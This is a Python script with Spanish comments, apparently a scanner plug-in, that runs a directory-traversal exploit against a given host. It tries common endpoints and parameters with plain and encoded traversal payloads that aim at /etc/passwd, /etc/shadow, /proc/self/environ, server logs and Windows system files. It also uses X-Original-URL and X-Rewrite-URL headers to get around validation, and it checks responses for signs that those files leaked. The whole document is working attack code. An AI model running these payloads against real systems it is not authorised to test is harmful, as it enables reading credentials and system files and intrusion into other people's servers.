import requests
import urllib.parse

def execute(target):
    """
    Exploit avanzado para Directory Traversal.
    """
    print(f"[INFO] Probando Directory Traversal en: {target}")

    # Endpoints comunes potencialmente vulnerables
    endpoints = ["/download", "/file", "/view", "/content", "/get", "/api/files", "/assets"]

    # Payloads avanzados con múltiples formas de codificación
    payloads = [
        "../../../../../../../../etc/passwd",          # Unix passwd file
        "../../../../../../../../etc/shadow",          # Unix shadow file
        "../../../../../../../../boot.ini",            # Windows boot configuration
        "../../../../../../../../windows/system32/drivers/etc/hosts",  # Windows hosts file
        "../../../../../../../../proc/self/environ",   # Environment variables
        "../../../../../../../../var/log/apache2/access.log",  # Apache logs
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",  # URL-encoded
        "..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",  # Windows path
        "..%5c..%5c..%5c..%5c..%5cboot.ini"           # Windows encoded
    ]

    # Cabeceras adicionales para bypass de validaciones
    headers = {
        "User-Agent": "AdvancedTraversalScanner/1.0",
        "X-Original-URL": "../../../../../../../../etc/passwd",
        "X-Rewrite-URL": "../../../../../../../../etc/passwd"
    }

    # Parámetros típicos y métodos
    params = ["file", "path", "filename", "download", "dir"]
    methods = ["GET", "POST"]
    vulnerable = False
    results = []

    # Probar métodos GET y POST en endpoints
    for endpoint in endpoints:
        for param in params:
            for payload in payloads:
                for method in methods:
                    try:
                        url = f"http://{target}{endpoint}"
                        if method == "GET":
                            full_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                            print(f"[INFO] Probar URL (GET): {full_url}")
                            response = requests.get(full_url, headers=headers, timeout=5)
                        elif method == "POST":
                            print(f"[INFO] Probar URL (POST): {url}")
                            response = requests.post(url, data={param: payload}, headers=headers, timeout=5)

                        # Indicadores de éxito
                        if response.status_code == 200 and (
                            "root:" in response.text or 
                            "boot loader" in response.text or 
                            "127.0.0.1" in response.text or 
                            "environment" in response.text.lower()
                        ):
                            print(f"[ALERTA] Directory Traversal detectado en {url} con payload: {payload} (Método: {method})")
                            results.append(f"Vulnerable en {url} con payload: {payload} (Método: {method})")
                            vulnerable = True
                    except Exception as e:
                        print(f"[ERROR] Error al probar Directory Traversal en {url}: {e}")

    # Pruebas adicionales específicas en cabeceras
    for payload in payloads:
        try:
            url = f"http://{target}/"
            print(f"[INFO] Probar cabeceras con payload: {payload}")
            response = requests.get(url, headers={"X-Original-URL": payload}, timeout=5)
            if "root:" in response.text or "boot loader" in response.text:
                print(f"[ALERTA] Directory Traversal detectado en cabecera X-Original-URL con payload: {payload}")
                results.append(f"Cabecera vulnerable con payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"[ERROR] Error al probar cabeceras con payload: {e}")

    # Resultados finales
    return " | ".join(results) if vulnerable else "No vulnerable a Directory Traversal"

